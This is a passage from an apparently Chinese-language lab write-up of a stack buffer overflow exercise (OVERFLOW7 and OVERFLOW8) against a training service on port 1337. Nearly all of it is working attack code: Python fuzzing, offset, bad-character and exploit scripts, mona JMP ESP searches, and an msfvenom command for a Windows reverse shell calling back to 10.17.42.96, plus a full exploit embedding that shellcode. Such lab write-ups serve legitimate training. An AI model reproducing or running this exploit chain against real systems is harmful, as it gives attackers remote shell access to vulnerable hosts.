class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.</p></blockquote><p>BADCHAR: <code>\x00\x8c\x8d\xae\xaf\xbe\xbf\xfb\xfc</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># badchar_confirm.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW7 &quot;</span></span><br><span class="line">offset = <span class="number">1306</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8b\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xad\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbd\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfa\xfc\xfd\xfe\xff&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>去掉BADCHAR<code>\x8c\xae\xbe\xfb</code>之后<code>\x8d\xaf\xbf\xfc</code>不受影响</p><p>BADCHAR: <code>\x00\x8c\xae\xbe\xfb</code></p><h3 id="jmp-esp-7"><a class="markdownIt-Anchor" href="#jmp-esp-7"></a> JMP ESP</h3><p>Immunity Debugger</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona jmp -r esp -cqb &quot;\x00\x8c\xae\xbe\xfb&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x625011af</span><br><span class="line">0x625011bb</span><br><span class="line">0x625011c7</span><br><span class="line">0x625011d3</span><br><span class="line">0x625011df</span><br><span class="line">0x625011eb</span><br><span class="line">0x625011f7</span><br><span class="line">0x62501203</span><br><span class="line">0x62501205</span><br></pre></td></tr></table></figure><h3 id="shellcode-7"><a class="markdownIt-Anchor" href="#shellcode-7"></a> SHELLCODE</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.17.42.96 LPORT=1337 -b <span class="string">&quot;\x00\x8c\xae\xbe\xfb&quot;</span> -f c</span><br></pre></td></tr></table></figure><h3 id="exploit-7"><a class="markdownIt-Anchor" href="#exploit-7"></a> EXPLOIT</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># exploit.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW7 &quot;</span></span><br><span class="line">offset = <span class="number">1306</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;\xaf\x11\x50\x62&quot;</span></span><br><span class="line">padding = <span class="string">&quot;\x90&quot;</span> * <span class="number">16</span></span><br><span class="line">payload = <span class="string">&quot;\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\x5f\x47\x95\x85\x83\xee\xfc\xe2\xf4\xa3\xaf\x17\x85\x5f\x47\xf5\x0c\xba\x76\x55\xe1\xd4\x17\xa5\x0e\x0d\x4b\x1e\xd7\x4b\xcc\xe7\xad\x50\xf0\xdf\xa3\x6e\xb8\x39\xb9\x3e\x3b\x97\xa9\x7f\x86\x5a\x88\x5e\x80\x77\x77\x0d\x10\x1e\xd7\x4f\xcc\xdf\xb9\xd4\x0b\x84\xfd\xbc\x0f\x94\x54\x0e\xcc\xcc\xa5\x5e\x94\x1e\xcc\x47\xa4\xaf\xcc\xd4\x73\x1e\x84\x89\x76\x6a\x29\x9e\x88\x98\x84\x98\x7f\x75\xf0\xa9\x44\xe8\x7d\x64\x3a\xb1\xf0\xbb\x1f\x1e\xdd\x7b\x46\x46\xe3\xd4\x4b\xde\x0e\x07\x5b\x94\x56\xd4\x43\x1e\x84\x8f\xce\xd1\xa1\x7b\x1c\xce\xe4\x06\x1d\xc4\x7a\xbf\x18\xca\xdf\xd4\x55\x7e\x08\x02\x2f\xa6\xb7\x5f\x47\xfd\xf2\x2c\x75\xca\xd1\x37\x0b\xe2\xa3\x58\xb8\x40\x3d\xcf\x46\x95\x85\x76\x83\xc1\xd5\x37\x6e\x15\xee\x5f\xb8\x40\xd5\x0f\x17\xc5\xc5\x0f\x07\xc5\xed\xb5\x48\x4a\x65\xa0\x92\x02\xef\x5a\x2f\x9f\x94\x75\x27\xfd\x87\x5f\x42\xac\x0c\xb9\x2d\x85\xd3\x08\x2f\x0c\x20\x2b\x26\x6a\x50\xda\x87\xe1\x89\xa0\x09\x9d\xf0\xb3\x2f\x65\x30\xfd\x11\x6a\x50\x37\x24\xf8\xe1\x5f\xce\x76\xd2\x08\x10\xa4\x73\x35\x55\xcc\xd3\xbd\xba\xf3\x42\x1b\x63\xa9\x84\x5e\xca\xd1\xa1\x4f\x81\x95\xc1\x0b\x17\xc3\xd3\x09\x01\xc3\xcb\x09\x11\xc6\xd3\x37\x3e\x59\xba\xd9\xb8\x40\x0c\xbf\x09\xc3\xc3\xa0\x77\xfd\x8d\xd8\x5a\xf5\x7a\x8a\xfc\x65\x30\xfd\x11\xfd\x23\xca\xfa\x08\x7a\x8a\x7b\x93\xf9\x55\xc7\x6e\x65\x2a\x42\x2e\xc2\x4c\x35\xfa\xef\x5f\x14\x6a\x50&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="overflow8"><a class="markdownIt-Anchor" href="#overflow8"></a> OVERFLOW8</h2><h3 id="fuzz-8"><a class="markdownIt-Anchor" href="#fuzz-8"></a> FUZZ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># fuzz.py</span></span><br><span class="line"><span class="keyword">import</span> socket, time, sys</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line"></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line">timeout = <span class="number">5</span></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW8 &quot;</span></span><br><span class="line"></span><br><span class="line">string = prefix + <span class="string">&quot;A&quot;</span> * <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">s.settimeout(timeout)</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">print(<span class="string">&quot;Fuzzing with &#123;&#125; bytes&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(string) - <span class="built_in">len</span>(prefix)))</span><br><span class="line">s.send(<span class="built_in">bytes</span>(string, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Fuzzing crashed at &#123;&#125; bytes&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(string) - <span class="built_in">len</span>(prefix)))</span><br><span class="line">sys.exit(<span class="number">0</span>)</span><br><span class="line">string += <span class="number">100</span> * <span class="string">&quot;A&quot;</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fuzzing crashed at 1800 bytes</span><br></pre></td></tr></table></figure><h3 id="offset-8"><a class="markdownIt-Anchor" href="#offset-8"></a> OFFSET</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1800</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># offset.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW8 &quot;</span></span><br><span class="line">offset = <span class="number">0</span></span><br><span class="line">overflow = <span class="string">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9&quot;</span></span><br><span class="line">retn = <span class="string">&quot;&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>EIP: 68433568 -&gt; hC5h -&gt; h5Ch</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q h5Ch -l 1800</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[*] Exact match at offset 1786</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># offset_confirm.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW8 &quot;</span></span><br><span class="line">offset = <span class="number">1786</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>EIP: 42424242 -&gt; BBBB</p><h3 id="badchar-8"><a class="markdownIt-Anchor" href="#badchar-8"></a> BADCHAR</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># charset.py</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">print(<span class="string">&quot;\\x&quot;</span> + <span class="string">&quot;&#123;:02x&#125;&quot;</span>.<span class="built_in">format</span>(x), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># badchar.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW8 &quot;</span></span><br><span class="line">offset = <span class="number">1786</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span 